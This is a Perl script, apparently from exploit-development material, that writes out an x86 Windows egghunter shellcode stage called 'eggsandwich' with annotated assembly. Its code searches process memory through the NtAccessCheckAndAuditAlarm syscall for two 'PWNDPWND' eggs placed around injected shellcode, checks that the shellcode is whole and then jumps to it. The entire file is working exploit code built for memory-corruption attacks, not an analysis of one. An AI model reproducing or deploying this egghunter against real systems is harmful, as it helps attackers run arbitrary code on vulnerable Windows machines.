#!/usr/bin/perl

# eggsandwich
# generates an egghunter that performs an integrity check before executing the shellcode
#
# To use, 'sandwich' your shellcode between two eggs: 
#    - the first egg will contain the egg text (PWNDPWND), and a series of ids/cumulative offsets to the second egg
#    - the second egg will contain the egg text (PWNDPWND) and the number of offsets from the first egg
# the offset values from egg 1 are added to the address of the shellcode to find the location of the second egg
# the second egg text and number of offsets are then validated before executing shellcode
# this helps prevent attempted execution of partial or corrupted shellcode
# note: it will not help prevent corrupted shellcode execution of the number of bytes remains the same
# 
# Example eggs to use for shellcode of size 351:  
# egg1 = "\x50\x57\x4e\x44\x50\x57\x4e\x44" .  # PWNDPWND
#        "\x01" . # start of egg 1 offsets
#        "\xff" . # 1st offset to 2nd egg (255)
#        "\x64" . # 2nd offset to 2nd egg + 4 (100)
#        "\x01";  # end of egg 1 offsets 
# egg2 = "\x50\x57\x4e\x44\x50\x57\x4e\x44" . # PWNDPWND
#        "\x02\x02"; # egg number (2) and number of offsets (2)

my $eggsandwich = 

# entry:
# loop_inc_page:
"\x66\x81\xCA\xFF\x0F" . 	# OR DX,0FFF 			; add PAGE_SIZE - 1 to EDX to get the last address in the page 

# loop_inc_one:
"\x42" .			# INC EDX 			; increment EDX by 1 to get current address

# check_memory:
"\x52" .			# PUSH EDX 			; save current address to stack
"\x6A\x02" .			# PUSH 02 			; push Syscall for NtAccessCheckAndAuditAlarm; or use 43 for NtDisplayString
"\x58" . 			# POP EAX			; pop syscall parameter into EAX for syscall
"\xCD\x2E" .			# INT 2E 			; issue interrupt to make syscall
"\x3C\x05" .			# CMP AL,5 			; compare low order byte of eax to 0x5 (indicates access violation)
"\x5A" . 			# POP EDX 			; restore EDX from the stack
"\x74\xEF" . 			# JE SHORT 			; if zf flag = 1, access violation, jump back to loop_inc_page
"\x33\xC9" . 			# XOR ECX,ECX 			; clear counter register for check egg function
"\x8B\xFA" . 			# MOV EDI,EDX 			; set edi to current address pointer for use in scasd

# check_egg:
"\xB8\x50\x57\x4E\x44" . 	# MOV EAX,444E5750 		; valid address, move egg value (PWND) into EAX for comparison
"\xAF" . 			# SCAS DWORD PTR ES:[EDI] 	; compare value in EAX to dword value addressed by EDI				#				; increments EDI by 4 if DF flag is 0 or decrement if 1
"\x75\xE8" . 			# JNZ SHORT 			; egg not found, jump back to loop_inc_one
"\xAF" . 			# SCAS DWORD PTR ES:[EDI] 	; first half of egg found, compare next half
"\x75\xE5" . 			# JNZ SHORT			; only first half found, jump back to loop_inc_one

# found_egg:
"\x8B\xF7".			# MOV ESI,EDI 			; egg found, move start address of shellcode to ESI for LODSB
"\x33\xC0" . 			# XOR EAX,EAX 			; clear EAX contents; necessary for add/sub instructions
"\xAC" . 			# LODS BYTE PTR DS:[ESI] 	; loads egg number (1 or 2) into AL
"\x3C\x01" . 			# CMP AL,1 			; determine if this is the first egg or second egg
"\xAC" . 			# LODS BYTE PTR DS:[ESI] 	; loads egg number (1 or 2) into AL
"\x74\x02" . 			# JE SHORT 			; if first egg, go to first_egg
"\xEB\x0C" . 			# JMP SHORT 			;  second egg found, go to second_egg

# first_egg
"\x41" . 			# INC ECX 			; increment egg counter to represent first egg
"\x03\xF8" . 			# ADD EDX,EAX 			; increment EDX by size of shellcode to point to 2nd egg for next check_egg
"\xAC" . 			# LODS BYTE PTR DS:[ESI] 	; loads egg number check into AL
"\x3C\x01" . 			# CMP AL,1 			; determine if this is the end of the first egg
"\x75\xF8" . 			# JE SHORT 			; still first egg, loop to beginning of first_egg
"\x8B\xDE" . 			# MOV EBX,ESI 			; move start of shellcode into EBX for second_egg
"\xEB\xDD" . 			# JMP SHORT 			; end of first egg; jump back to check_egg to search for second egg

# second_egg:
"\x3A\xC1" . 			# CMP AL,CL 			; check if egg2 chunk count matches cl counter
"\x75\xD9" .			# JNZ SHORT 			; if not, egg2 likely found first, indicating shellcode fragment 
				#				; jump back to check_egg
"\xFF\xE3"; 			# JMP EBX 			; otherwise, execute shellcode

my $file = "eggsandwich";

open(FILE, ">$file");
print FILE $eggsandwich;
close(FILE);
print "Eggsandwich file [" . $file . "] created\n";
print "Size: " . length($eggsandwich) . "\n";
